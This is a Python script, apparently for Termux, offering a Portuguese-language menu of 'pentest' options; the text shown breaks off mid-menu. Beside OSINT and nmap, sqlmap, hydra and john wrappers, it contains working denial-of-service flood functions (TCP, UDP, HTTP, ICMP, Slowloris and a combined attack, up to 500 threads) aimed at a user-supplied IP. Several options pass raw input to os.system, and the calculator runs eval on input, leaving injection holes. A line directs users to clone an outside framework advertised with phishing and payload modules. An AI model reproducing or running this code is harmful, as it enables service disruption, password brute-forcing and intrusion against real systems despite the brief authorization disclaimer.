#!/usr/bin/env python3
# ============================================================
# JOVIX ULTIMATE TOOL v13.0 - 66 FERRAMENTAS + BOOGIE
# CRIADO POR: JOVIX
# ============================================================

import os
import sys
import socket
import threading
import subprocess
import time
import random
import hashlib
import base64
import re
import json
import datetime
from datetime import datetime

# ============ CORES ============
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
C = "\033[96m"
M = "\033[95m"
W = "\033[97m"
B = "\033[1m"
RS = "\033[0m"

STOP_ATTACK = False
VERSION = "v13.0 - 66 FERRAMENTAS + BOOGIE"

# ============ COMANDOS ============
comandos = {}

# ============ BANNER ============
def banner():
    os.system('clear')
    print(f"""
{R}╔══════════════════════════════════════════════════════════════════════════╗
║                                                                          ║
║     {B}██╗   ██╗ ██████╗ ██╗   ██╗██╗██╗  ██╗{R}                           ║
║     {B}██║   ██║██╔═══██╗██║   ██║██║╚██╗██╔╝{R}                           ║
║     {B}██║   ██║██║   ██║██║   ██║██║ ╚███╔╝ {R}                           ║
║     {B}╚██╗ ██╔╝██║   ██║██║   ██║██║ ██╔██╗{R}                           ║
║      {B}╚████╔╝ ╚██████╔╝╚██████╔╝██║██╔╝ ██╗{R}                          ║
║       {B}╚═══╝   ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═╝{R}                          ║
║                                                                          ║
║          {B}JOVIX ULTIMATE TOOL {VERSION}{RS}{R}                            ║
║          {Y}Termux - Full Pentest Suite{RS}{R}                            ║
║          {M}Criado por: JOVIX{RS}{R}                                      ║
╚══════════════════════════════════════════════════════════════════════════╝{RS}
""")
    print(f"{C}[+] IP Local: {ip_local()}{RS}")
    print(f"{G}[+] Data: {datetime.now().strftime('%d/%m/%Y %H:%M')}{RS}")
    print(f"{M}[+] {len(comandos)} Comandos Disponíveis{RS}\n")

# ============ FUNÇÕES BÁSICAS ============
def ip_local():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def ip_publico():
    try:
        import requests
        return requests.get('https://api.ipify.org', timeout=3).text
    except:
        try:
            return subprocess.check_output("curl -s ifconfig.me", shell=True).decode().strip()
        except:
            return "N/A"

def ip_roteador():
    try:
        return subprocess.check_output("ip route | grep default", shell=True).decode().split()[2]
    except:
        return "192.168.1.1"

def clear():
    os.system('clear')

def pausa():
    input(f"{Y}Pressione ENTER para continuar{RS}")

def input_ip(mensagem):
    while True:
        ip = input(mensagem)
        if ip == "":
            return ip_local()
        try:
            socket.inet_aton(ip)
            return ip
        except:
            print(f"{R}[!] IP inválido{RS}")

def input_porta(mensagem):
    while True:
        try:
            porta = int(input(mensagem))
            if 1 <= porta <= 65535:
                return porta
            print(f"{R}[!] Porta inválida{RS}")
        except ValueError:
            print(f"{R}[!] Digite um número{RS}")

def input_numero(mensagem):
    while True:
        try:
            return int(input(mensagem))
        except ValueError:
            print(f"{R}[!] Digite um número{RS}")

def check_ferramenta(nome):
    try:
        subprocess.check_output(f"which {nome}", shell=True, stderr=subprocess.DEVNULL)
        return True
    except:
        return False

# ============ 1-10: OSINT ============
def op1_geolocalizar():
    clear()
    banner()
    ip = input_ip(f"{Y}Digite o IP (ENTER para local): {RS}")
    try:
        import requests
        r = requests.get(f'https://ipinfo.io/{ip}/json', timeout=5).json()
        if r.get('bogon'):
            print(f"{R}[!] IP privado ou inválido! Use um IP público.{RS}")
        else:
            print(f"{G}[+] IP: {r.get('ip', 'N/A')}{RS}")
            print(f"{G}[+] País: {r.get('country', 'N/A')}{RS}")
            print(f"{G}[+] Cidade: {r.get('city', 'N/A')}{RS}")
            print(f"{G}[+] Região: {r.get('region', 'N/A')}{RS}")
            print(f"{G}[+] ISP: {r.get('org', 'N/A')}{RS}")
            print(f"{G}[+] Coordenadas: {r.get('loc', 'N/A')}{RS}")
            print(f"{G}[+] Fuso horário: {r.get('timezone', 'N/A')}{RS}")
    except Exception as e:
        print(f"{R}[!] Erro: {e}{RS}")
    pausa()
comandos['1'] = op1_geolocalizar

def op2_dns_reverso():
    clear()
    banner()
    ip = input_ip(f"{Y}Digite o IP (ENTER para local): {RS}")
    try:
        print(f"{G}[+] DNS: {socket.gethostbyaddr(ip)[0]}{RS}")
    except:
        print(f"{R}[!] Nenhum DNS reverso{RS}")
    pausa()
comandos['2'] = op2_dns_reverso

def op3_whois():
    clear()
    banner()
    dominio = input(f"{Y}Digite o domínio: {RS}")
    try:
        r = subprocess.check_output(f"whois {dominio}", shell=True, stderr=subprocess.DEVNULL).decode()
        print(r[:500])
    except:
        print(f"{R}[!] Erro{RS}")
    pausa()
comandos['3'] = op3_whois

def op4_ip_publico():
    clear()
    banner()
    print(f"{G}[+] IP Público: {ip_publico()}{RS}")
    pausa()
comandos['4'] = op4_ip_publico

def op5_ip_local():
    clear()
    banner()
    print(f"{G}[+] IP Local: {ip_local()}{RS}")
    print(f"{G}[+] Roteador: {ip_roteador()}{RS}")
    pausa()
comandos['5'] = op5_ip_local

def op6_resolver_dns():
    clear()
    banner()
    dominio = input(f"{Y}Digite o domínio: {RS}")
    try:
        print(f"{G}[+] IP: {socket.gethostbyname(dominio)}{RS}")
    except:
        print(f"{R}[!] Erro{RS}")
    pausa()
comandos['6'] = op6_resolver_dns

def op7_ping():
    clear()
    banner()
    ip = input_ip(f"{Y}Digite o IP: {RS}")
    os.system(f"ping -c 4 {ip}")
    pausa()
comandos['7'] = op7_ping

def op8_traceroute():
    clear()
    banner()
    ip = input_ip(f"{Y}Digite o IP: {RS}")
    os.system(f"traceroute {ip}")
    pausa()
comandos['8'] = op8_traceroute

def op9_portas_abertas():
    clear()
    banner()
    os.system("ss -tuln 2>/dev/null | grep LISTEN | awk '{print $5}' | cut -d':' -f2 | sort -u")
    pausa()
comandos['9'] = op9_portas_abertas

def op10_scan_portas():
    clear()
    banner()
    ip = input_ip(f"{Y}Digite o IP (ENTER para local): {RS}")
    portas = input(f"{Y}Portas (ex: 80,443,22): {RS}").split(',')
    for p in portas:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((ip, int(p)))
            s.close()
            print(f"{G}[+] Porta {p}: ABERTA{RS}")
        except:
            print(f"{R}[+] Porta {p}: FECHADA{RS}")
    pausa()
comandos['10'] = op10_scan_portas

# ============ 11-20: NMAP ============
def op11_nmap_scan():
    clear()
    banner()
    ip = input_ip(f"{Y}Digite o IP: {RS}")
    if check_ferramenta("nmap"):
        os.system(f"nmap -sV -p- {ip}")
    else:
        print(f"{R}[!] Instale: pkg install nmap{RS}")
    pausa()
comandos['11'] = op11_nmap_scan

def op12_nmap_rapido():
    clear()
    banner()
    ip = input_ip(f"{Y}Digite o IP: {RS}")
    if check_ferramenta("nmap"):
        os.system(f"nmap -T4 -F {ip}")
    else:
        print(f"{R}[!] Instale: pkg install nmap{RS}")
    pausa()
comandos['12'] = op12_nmap_rapido

def op13_nmap_rede():
    clear()
    banner()
    rede = input(f"{Y}Digite a rede (ex: 192.168.1.0/24): {RS}")
    if check_ferramenta("nmap"):
        os.system(f"nmap -sn {rede}")
    else:
        print(f"{R}[!] Instale: pkg install nmap{RS}")
    pausa()
comandos['13'] = op13_nmap_rede

def op14_nmap_servicos():
    clear()
    banner()
    ip = input_ip(f"{Y}Digite o IP: {RS}")
    if check_ferramenta("nmap"):
        os.system(f"nmap -sV -sC -p 80,443,22,21,25,53,3306,8080 {ip}")
    else:
        print(f"{R}[!] Instale: pkg install nmap{RS}")
    pausa()
comandos['14'] = op14_nmap_servicos

def op15_nmap_vuln():
    clear()
    banner()
    ip = input_ip(f"{Y}Digite o IP: {RS}")
    if check_ferramenta("nmap"):
        os.system(f"nmap --script vuln {ip}")
    else:
        print(f"{R}[!] Instale: pkg install nmap{RS}")
    pausa()
comandos['15'] = op15_nmap_vuln

def op16_nmap_scripts():
    clear()
    banner()
    ip = input_ip(f"{Y}Digite o IP: {RS}")
    if check_ferramenta("nmap"):
        os.system(f"nmap -sC {ip}")
    else:
        print(f"{R}[!] Instale: pkg install nmap{RS}")
    pausa()
comandos['16'] = op16_nmap_scripts

def op17_nmap_udp():
    clear()
    banner()
    ip = input_ip(f"{Y}Digite o IP: {RS}")
    if check_ferramenta("nmap"):
        os.system(f"nmap -sU -p 53,123,161,445 {ip}")
    else:
        print(f"{R}[!] Instale: pkg install nmap{RS}")
    pausa()
comandos['17'] = op17_nmap_udp

def op18_nmap_os():
    clear()
    banner()
    ip = input_ip(f"{Y}Digite o IP: {RS}")
    if check_ferramenta("nmap"):
        os.system(f"nmap -O {ip}")
    else:
        print(f"{R}[!] Instale: pkg install nmap{RS}")
    pausa()
comandos['18'] = op18_nmap_os

def op19_nmap_firewall():
    clear()
    banner()
    ip = input_ip(f"{Y}Digite o IP: {RS}")
    if check_ferramenta("nmap"):
        os.system(f"nmap -sA {ip}")
    else:
        print(f"{R}[!] Instale: pkg install nmap{RS}")
    pausa()
comandos['19'] = op19_nmap_firewall

def op20_nmap_all():
    clear()
    banner()
    ip = input_ip(f"{Y}Digite o IP: {RS}")
    if check_ferramenta("nmap"):
        os.system(f"nmap -sS -sV -sC -A -O -p- {ip}")
    else:
        print(f"{R}[!] Instale: pkg install nmap{RS}")
    pausa()
comandos['20'] = op20_nmap_all

# ============ 21-30: PENTEST ============
def op21_sqlmap():
    clear()
    banner()
    url = input(f"{Y}URL (ex: site.com/page?id=1): {RS}")
    if check_ferramenta("sqlmap"):
        os.system(f"sqlmap -u {url} --batch --level=2")
    else:
        print(f"{R}[!] Instale: pkg install sqlmap ou git clone https://github.com/sqlmapproject/sqlmap.git{RS}")
    pausa()
comandos['21'] = op21_sqlmap

def op22_sqlmap_db():
    clear()
    banner()
    url = input(f"{Y}URL: {RS}")
    if check_ferramenta("sqlmap"):
        os.system(f"sqlmap -u {url} --dbs")
    else:
        print(f"{R}[!] Instale: pkg install sqlmap ou git clone https://github.com/sqlmapproject/sqlmap.git{RS}")
    pausa()
comandos['22'] = op22_sqlmap_db

def op23_hydra():
    clear()
    banner()
    ip = input_ip(f"{Y}IP alvo: {RS}")
    servico = input(f"{Y}Serviço (ssh/ftp/etc): {RS}")
    usuario = input(f"{Y}Usuário: {RS}")
    if check_ferramenta("hydra"):
        os.system(f"hydra -l {usuario} -P /usr/share/wordlists/rockyou.txt {ip} {servico}")
    else:
        print(f"{R}[!] Instale: pkg install hydra ou git clone https://github.com/vanhauser-thc/thc-hydra.git{RS}")
    pausa()
comandos['23'] = op23_hydra

def op24_nikto():
    clear()
    banner()
    ip = input_ip(f"{Y}IP alvo: {RS}")
    if check_ferramenta("nikto"):
        os.system(f"nikto -h {ip}")
    else:
        print(f"{R}[!] Instale: git clone https://github.com/sullo/nikto.git e cd nikto && perl nikto.pl -h{RS}")
    pausa()
comandos['24'] = op24_nikto

def op25_gobuster():
    clear()
    banner()
    url = input(f"{Y}URL: {RS}")
    if check_ferramenta("gobuster"):
        os.system(f"gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt")
    else:
        print(f"{R}[!] Instale: pkg install gobuster ou git clone https://github.com/OJ/gobuster.git{RS}")
    pausa()
comandos['25'] = op25_gobuster

def op26_john():
    clear()
    banner()
    arquivo = input(f"{Y}Arquivo de hash: {RS}")
    if check_ferramenta("john"):
        os.system(f"john {arquivo}")
    else:
        print(f"{R}[!] Instale: git clone https://github.com/openwall/john.git{RS}")
    pausa()
comandos['26'] = op26_john

def op27_john_show():
    clear()
    banner()
    arquivo = input(f"{Y}Arquivo: {RS}")
    if check_ferramenta("john"):
        os.system(f"john --show {arquivo}")
    else:
        print(f"{R}[!] Instale: git clone https://github.com/openwall/john.git{RS}")
    pausa()
comandos['27'] = op27_john_show

def op28_sherlock():
    clear()
    banner()
    usuario = input(f"{Y}Nome de usuário: {RS}")
    if os.path.exists("sherlock"):
        os.system(f"cd sherlock && python sherlock.py {usuario}")
    else:
        print(f"{R}[!] Clone: git clone https://github.com/sherlock-project/sherlock.git{RS}")
    pausa()
comandos['28'] = op28_sherlock

def op29_shodan():
    clear()
    banner()
    ip = input_ip(f"{Y}IP: {RS}")
    try:
        import requests
        r = requests.get(f"https://internetdb.shodan.io/{ip}").json()
        print(f"{G}[+] Portas: {r.get('ports', [])}{RS}")
        print(f"{G}[+] Vulns: {r.get('vulns', [])}{RS}")
    except:
        print(f"{R}[!] Erro{RS}")
    pausa()
comandos['29'] = op29_shodan

def op30_whatweb():
    clear()
    banner()
    url = input(f"{Y}URL: {RS}")
    if check_ferramenta("whatweb"):
        os.system(f"whatweb {url}")
    else:
        print(f"{R}[!] Instale: git clone https://github.com/urbanadventurer/WhatWeb.git{RS}")
    pausa()
comandos['30'] = op30_whatweb

# ============ 31-40: DDOS ============
def tcp_flood(ip, porta):
    while not STOP_ATTACK:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.2)
            s.connect((ip, porta))
            s.send(random._urandom(1024))
            s.close()
        except:
            pass

def udp_flood(ip, porta):
    pkt = random._urandom(65500)
    while not STOP_ATTACK:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(pkt, (ip, porta))
            s.close()
        except:
            pass

def http_flood(ip, porta):
    headers = [f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"]
    while not STOP_ATTACK:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect((ip, porta))
            s.send(random.choice(headers).encode())
            s.close()
        except:
            pass

def syn_flood(ip, porta):
    while not STOP_ATTACK:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((ip, porta))
            s.close()
        except:
            pass

def icmp_flood(ip):
    while not STOP_ATTACK:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            pkt = b'\x08\x00\x00\x00\x00\x00\x00\x00' + random._urandom(1024)
            s.sendto(pkt, (ip, 0))
            s.close()
        except PermissionError:
            print(f"{R}[!] ICMP precisa de root. Use: su{RS}")
            break
        except:
            pass

def slowloris(ip, porta):
    while not STOP_ATTACK:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((ip, porta))
            s.send(b"GET / HTTP/1.1\r\n")
            time.sleep(random.uniform(0.1, 0.5))
            s.send(b"Host: " + ip.encode() + b"\r\n")
            time.sleep(random.uniform(0.1, 0.5))
            s.send(b"\r\n")
            s.close()
        except:
            pass

def op31_tcp_flood():
    clear()
    banner()
    ip = input_ip(f"{Y}IP alvo: {RS}")
    porta = input_porta(f"{Y}Porta: {RS}")
    threads = input_numero(f"{Y}Threads (1-500): {RS}")
    global STOP_ATTACK
    STOP_ATTACK = False
    print(f"{G}[+] Iniciando TCP Flood...{RS}")
    for i in range(threads):
        t = threading.Thread(target=tcp_flood, args=(ip, porta))
        t.daemon = True
        t.start()
    input(f"{Y}Pressione ENTER para parar{RS}")
    STOP_ATTACK = True
comandos['31'] = op31_tcp_flood

def op32_udp_flood():
    clear()
    banner()
    ip = input_ip(f"{Y}IP alvo: {RS}")
    porta = input_porta(f"{Y}Porta: {RS}")
    threads = input_numero(f"{Y}Threads (1-500): {RS}")
    global STOP_ATTACK
    STOP_ATTACK = False
    print(f"{G}[+] Iniciando UDP Flood...{RS}")
    for i in range(threads):
        t = threading.Thread(target=udp_flood, args=(ip, porta))
        t.daemon = True
        t.start()
    input(f"{Y}Pressione ENTER para parar{RS}")
    STOP_ATTACK = True
comandos['32'] = op32_udp_flood

def op33_http_flood():
    clear()
    banner()
    ip = input_ip(f"{Y}IP alvo: {RS}")
    porta = input_porta(f"{Y}Porta: {RS}")
    threads = input_numero(f"{Y}Threads (1-500): {RS}")
    global STOP_ATTACK
    STOP_ATTACK = False
    print(f"{G}[+] Iniciando HTTP Flood...{RS}")
    for i in range(threads):
        t = threading.Thread(target=http_flood, args=(ip, porta))
        t.daemon = True
        t.start()
    input(f"{Y}Pressione ENTER para parar{RS}")
    STOP_ATTACK = True
comandos['33'] = op33_http_flood

def op34_syn_flood():
    clear()
    banner()
    ip = input_ip(f"{Y}IP alvo: {RS}")
    porta = input_porta(f"{Y}Porta: {RS}")
    threads = input_numero(f"{Y}Threads (1-500): {RS}")
    global STOP_ATTACK
    STOP_ATTACK = False
    print(f"{G}[+] Iniciando SYN Flood...{RS}")
    for i in range(threads):
        t = threading.Thread(target=syn_flood, args=(ip, porta))
        t.daemon = True
        t.start()
    input(f"{Y}Pressione ENTER para parar{RS}")
    STOP_ATTACK = True
comandos['34'] = op34_syn_flood

def op35_icmp_flood():
    clear()
    banner()
    ip = input_ip(f"{Y}IP alvo: {RS}")
    threads = input_numero(f"{Y}Threads (1-500): {RS}")
    global STOP_ATTACK
    STOP_ATTACK = False
    print(f"{G}[+] Iniciando ICMP Flood (requer root)...{RS}")
    for i in range(threads):
        t = threading.Thread(target=icmp_flood, args=(ip,))
        t.daemon = True
        t.start()
    input(f"{Y}Pressione ENTER para parar{RS}")
    STOP_ATTACK = True
comandos['35'] = op35_icmp_flood

def op36_slowloris():
    clear()
    banner()
    ip = input_ip(f"{Y}IP alvo: {RS}")
    porta = input_porta(f"{Y}Porta: {RS}")
    threads = input_numero(f"{Y}Threads (1-500): {RS}")
    global STOP_ATTACK
    STOP_ATTACK = False
    print(f"{G}[+] Iniciando Slowloris...{RS}")
    for i in range(threads):
        t = threading.Thread(target=slowloris, args=(ip, porta))
        t.daemon = True
        t.start()
    input(f"{Y}Pressione ENTER para parar{RS}")
    STOP_ATTACK = True
comandos['36'] = op36_slowloris

def op37_ddos_multi():
    clear()
    banner()
    ip = input_ip(f"{Y}IP alvo: {RS}")
    porta = input_porta(f"{Y}Porta: {RS}")
    threads = input_numero(f"{Y}Threads (1-500): {RS}")
    global STOP_ATTACK
    STOP_ATTACK = False
    print(f"{G}[+] Iniciando Ataque Múltiplo (TCP+UDP+HTTP)...{RS}")
    tipos = ["tcp", "udp", "http"]
    for i in range(threads):
        tipo = random.choice(tipos)
        if tipo == "tcp":
            t = threading.Thread(target=tcp_flood, args=(ip, porta))
        elif tipo == "udp":
            t = threading.Thread(target=udp_flood, args=(ip, porta))
        else:
            t = threading.Thread(target=http_flood, args=(ip, porta))
        t.daemon = True
        t.start()
    input(f"{Y}Pressione ENTER para parar{RS}")
    STOP_ATTACK = True
comandos['37'] = op37_ddos_multi

def op38_stop_attack():
    global STOP_ATTACK
    STOP_ATTACK = True
    print(f"{G}[+] Ataque parado!{RS}")
    pausa()
comandos['38'] = op38_stop_attack

# ============ 39-50: REDE E UTILITÁRIOS ============
def op39_scan_rede():
    clear()
    banner()
    ip_base = ip_local().rsplit('.', 1)[0] + '.'
    print(f"{Y}[+] Escaneando rede {ip_base}0/24...{RS}")
    for i in range(1, 255):
        ip = ip_base + str(i)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect((ip, 80))
            s.close()
            print(f"{G}[+] {ip} - ativo (porta 80){RS}")
        except:
            pass
    pausa()
comandos['39'] = op39_scan_rede

def op40_info_rede():
    clear()
    banner()
    os.system("ip addr show")
    pausa()
comandos['40'] = op40_info_rede

def op41_wifi_info():
    clear()
    banner()
    os.system("dumpsys wifi 2>/dev/null | grep -E 'SSID|BSSID' | head -10")
    pausa()
comandos['41'] = op41_wifi_info

def op42_router_info():
    clear()
    banner()
    print(f"{G}[+] Roteador: {ip_roteador()}{RS}")
    os.system("ip route | grep default")
    pausa()
comandos['42'] = op42_router_info

def op43_mac_address():
    clear()
    banner()
    os.system("ip link | grep -E 'link/ether|wlan'")
    pausa()
comandos['43'] = op43_mac_address

def op44_servidor_local():
    clear()
    banner()
    porta = input_porta(f"{Y}Porta: {RS}")
    os.system(f"python -m http.server {porta} &")
    print(f"{G}[+] Servidor em http://{ip_local()}:{porta}{RS}")
    input(f"{Y}Pressione ENTER para parar{RS}")
    os.system(f"pkill -f 'http.server {porta}'")
    pausa()
comandos['44'] = op44_servidor_local

def op45_testar_porta():
    clear()
    banner()
    ip = input_ip(f"{Y}IP (ENTER para local): {RS}")
    porta = input_porta(f"{Y}Porta: {RS}")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((ip, porta))
        s.close()
        print(f"{G}[+] Porta {porta}: ABERTA{RS}")
    except:
        print(f"{R}[+] Porta {porta}: FECHADA{RS}")
    pausa()
comandos['45'] = op45_testar_porta

def op46_gerador_senha():
    clear()
    banner()
    t = input_numero(f"{Y}Tamanho: {RS}")
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"
    print(f"{G}[+] Senha: {''.join(random.choice(chars) for _ in range(t))}{RS}")
    pausa()
comandos['46'] = op46_gerador_senha

def op47_hash_md5():
    clear()
    banner()
    texto = input(f"{Y}Texto: {RS}")
    print(f"{G}[+] MD5: {hashlib.md5(texto.encode()).hexdigest()}{RS}")
    pausa()
comandos['47'] = op47_hash_md5

def op48_hash_sha256():
    clear()
    banner()
    texto = input(f"{Y}Texto: {RS}")
    print(f"{G}[+] SHA256: {hashlib.sha256(texto.encode()).hexdigest()}{RS}")
    pausa()
comandos['48'] = op48_hash_sha256

def op49_base64_encode():
    clear()
    banner()
    texto = input(f"{Y}Texto: {RS}")
    print(f"{G}[+] Base64: {base64.b64encode(texto.encode()).decode()}{RS}")
    pausa()
comandos['49'] = op49_base64_encode

def op50_base64_decode():
    clear()
    banner()
    texto = input(f"{Y}Base64: {RS}")
    try:
        print(f"{G}[+] Decodificado: {base64.b64decode(texto).decode()}{RS}")
    except:
        print(f"{R}[!] Erro{RS}")
    pausa()
comandos['50'] = op50_base64_decode

# ============ 51-60: EXTRA ============
def op51_data_hora():
    clear()
    banner()
    print(f"{G}[+] Data: {datetime.now().strftime('%d/%m/%Y')}{RS}")
    print(f"{G}[+] Hora: {datetime.now().strftime('%H:%M:%S')}{RS}")
    pausa()
comandos['51'] = op51_data_hora

def op52_limpar_cache():
    clear()
    banner()
    os.system("pkg clean")
    print(f"{G}[+] Cache limpo!{RS}")
    pausa()
comandos['52'] = op52_limpar_cache

def op53_info_sistema():
    clear()
    banner()
    print(f"{G}[+] Sistema: {os.name}{RS}")
    print(f"{G}[+] Python: {sys.version.split()[0]}{RS}")
    print(f"{G}[+] IP Local: {ip_local()}{RS}")
    print(f"{G}[+] IP Público: {ip_publico()}{RS}")
    print(f"{G}[+] Roteador: {ip_roteador()}{RS}")
    print(f"{G}[+] Processador: {os.cpu_count()} cores{RS}")
    pausa()
comandos['53'] = op53_info_sistema

def op54_abrir_porta_manual():
    clear()
    banner()
    ip_rot = ip_roteador()
    ip_cel = ip_local()
    print(f"""
{Y}INSTRUÇÕES PARA ABRIR PORTA NO ROTEADOR:{RS}
1. Acesse: {C}http://{ip_rot}{RS}
2. Login: admin/admin
3. Procure: {C}Port Forwarding / NAT{RS}
4. Crie regra: Nome=JOVIX, Porta=8080, IP={C}{ip_cel}{RS}
5. Teste: {C}http://canyouseeme.org{RS}
""")
    pausa()
comandos['54'] = op54_abrir_porta_manual

def op55_calculadora():
    clear()
    banner()
    expr = input(f"{Y}Digite a expressão (ex: 2+2): {RS}")
    try:
        resultado = eval(expr)
        print(f"{G}[+] Resultado: {resultado}{RS}")
    except:
        print(f"{R}[!] Expressão inválida{RS}")
    pausa()
comandos['55'] = op55_calculadora

def op56_conversor_temperatura():
    clear()
    banner()
    celsius = input_numero(f"{Y}Digite a temperatura em °C: {RS}")
    fahrenheit = (celsius * 9/5) + 32
    kelvin = celsius + 273.15
    print(f"{G}[+] °F: {fahrenheit:.2f}{RS}")
    print(f"{G}[+] K: {kelvin:.2f}{RS}")
    pausa()
comandos['56'] = op56_conversor_temperatura

def op57_gerador_qr():
    clear()
    banner()
    texto = input(f"{Y}Digite o texto para gerar QR Code: {RS}")
    try:
        import qrcode
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(texto)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        img.save("qrcode.png")
        print(f"{G}[+] QR Code salvo como qrcode.png{RS}")
        os.system("termux-share qrcode.png")
    except ImportError:
        print(f"{R}[!] Instale: pip install qrcode{RS}")
    pausa()
comandos['57'] = op57_gerador_qr

def op58_gerador_boleto():
    clear()
    banner()
    print(f"{Y}[+] GERADOR DE BOLETO FALSO (BRINCADEIRA){RS}")
    valor = input(f"{Y}Digite o valor: {RS}")
    codigo = ''.join(random.choice('0123456789') for _ in range(47))
    print(f"{G}[+] Código de barras: {codigo}{RS}")
    print(f"{Y}[!] Isso é apenas uma brincadeira! Não use para fraudes.{RS}")
    pausa()
comandos['58'] = op58_gerador_boleto

def op59_gerador_cpf():
    clear()
    banner()
    print(f"{Y}[+] GERADOR DE CPF FALSO (BRINCADEIRA){RS}")
    cpf = ''.join(random.choice('0123456789') for _ in range(11))
    print(f"{G}[+] CPF: {cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}{RS}")
    print(f"{Y}[!] Isso é apenas uma brincadeira! Não use para fraudes.{RS}")
    pausa()
comandos['59'] = op59_gerador_cpf

def op60_gerador_placa():
    clear()
    banner()
    print(f"{Y}[+] GERADOR DE PLACA DE CARRO (BRINCADEIRA){RS}")
    letras = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(3))
    numeros = ''.join(random.choice('0123456789') for _ in range(4))
    placa = f"{letras}-{numeros}"
    print(f"{G}[+] Placa: {placa}{RS}")
    pausa()
comandos['60'] = op60_gerador_placa

# ============ 61-65: SOBRE E SAIR ============
def op61_sobre():
    clear()
    banner()
    print(f"""
{Y}══════════════════════════════════════════════════════════════════════════{RS}
{G}{B}JOVIX ULTIMATE TOOL v13.0 - 66 FERRAMENTAS + BOOGIE{RS}

{Y}Ferramentas:{RS}
- OSINT: Geolocalização, DNS, WHOIS, Shodan, Sherlock
- NMAP: Scan, Rápido, Rede, Serviços, Vuln, UDP, OS, Firewall
- PENTEST: SQLmap, Hydra, Nikto, Gobuster, John, WhatWeb
- DDOS: TCP Flood, UDP Flood, HTTP Flood, SYN Flood, ICMP Flood
- REDE: Scan Rede, Info, WiFi, MAC, Servidor Local
- UTILITÁRIOS: Senha, Hash, Base64, Data/Hora, Cache
- EXTRAS: Calculadora, Conversor, QR Code, CPF, Placa
- BOOGIE: Framework de pentest (47+ módulos)

{R}ATENÇÃO:{RS}
Use apenas em sistemas próprios ou com autorização.
O uso indevido é crime (Lei 12.737/2012).
{Y}══════════════════════════════════════════════════════════════════════════{RS}
""")
    pausa()
comandos['61'] = op61_sobre

# ============ 66: BOOGIE ============
def op66_boogie():
    clear()
    banner()
    print(f"{G}[+] INICIANDO BOOGIE FRAMEWORK...{RS}")
    print(f"{Y}Boogie - 47+ módulos de pentest{RS}")
    print(f"{Y}Inclui: SQLi, XSS, Phishing, Payloads, Subdomínios{RS}\n")
    
    if os.path.exists("Boogie"):
        print(f"{G}[+] Boogie encontrado! Iniciando...{RS}")
        os.system("cd Boogie && python boogie.py")
    else:
        print(f"{R}[!] Boogie não instalado. Instale com:{RS}")
        print(f"{C}git clone https://github.com/anonymous-beta/Boogie.git{RS}")
        print(f"{C}cd Boogie && python boogie.py{RS}")
    pausa()
comandos['66'] = op66_boogie

def op62_sair():
    print(f"{G}[+] Saindo da JOVIX ULTIMATE TOOL...{RS}")
    sys.exit(0)
comandos['62'] = op62_sair

# ============ MENU ============
def menu():
    while True:
        clear()
        banner()
        print(f"""
{Y}══════════════════════════════════════════════════════════════════════════{RS}
{Y}JOVIX ULTIMATE TOOL - 66 OPÇÕES{RS}

{C}[01]{RS} Geolocalizar        {C}[11]{RS} Nmap Scan         {C}[21]{RS} SQLmap           {C}[31]{RS} TCP Flood
{C}[02]{RS} DNS Reverso         {C}[12]{RS} Nmap Rápido      {C}[22]{RS} SQLmap DB        {C}[32]{RS} UDP Flood
{C}[03]{RS} WHOIS               {C}[13]{RS} Nmap Rede        {C}[23]{RS} Hydra            {C}[33]{RS} HTTP Flood
{C}[04]{RS} IP Público          {C}[14]{RS} Nmap Serviços    {C}[24]{RS} Nikto            {C}[34]{RS} SYN Flood
{C}[05]{RS} IP Local            {C}[15]{RS} Nmap Vuln        {C}[25]{RS} Gobuster         {C}[35]{RS} ICMP Flood
{C}[06]{RS} Resolver DNS        {C}[16]{RS} Nmap Scripts     {C}[26]{RS} John             {C}[36]{RS} Slowloris
{C}[07]{RS} Ping                {C}[17]{RS} Nmap UDP         {C}[27]{RS} John Show        {C}[37]{RS} DDOS Múltiplo
{C}[08]{RS} Traceroute          {C}[18]{RS} Nmap OS          {C}[28]{RS} Sherlock         {C}[38]{RS} Parar Ataque
{C}[09]{RS} Portas Abertas      {C}[19]{RS} Nmap Firewall    {C}[29]{RS} Shodan           {C}[39]{RS} Scan Rede
{C}[10]{RS} Scan Portas         {C}[20]{RS} Nmap All         {C}[30]{RS} WhatWeb          {C}[40]{RS} Info Rede

{C}[41]{RS} WiFi Info           {C}[51]{RS} Data/Hora         {C}[61]{RS} Sobre
{C}[42]{RS} Router Info         {C}[52]{RS} Limpar Cache      {C}[62]{RS} Sair
{C}[43]{RS} MAC Address         {C}[53]{RS} Info Sistema      {C}[66]{RS} BOOGIE
{C}[44]{RS} Servidor Local      {C}[54]{RS} Abrir Porta
{C}[45]{RS} Testar Porta        {C}[55]{RS} Calculadora
{C}[46]{RS} Gerador Senha       {C}[56]{RS} Conversor Temp
{C}[47]{RS} MD5 Hash            {C}[57]{RS} Gerador QR
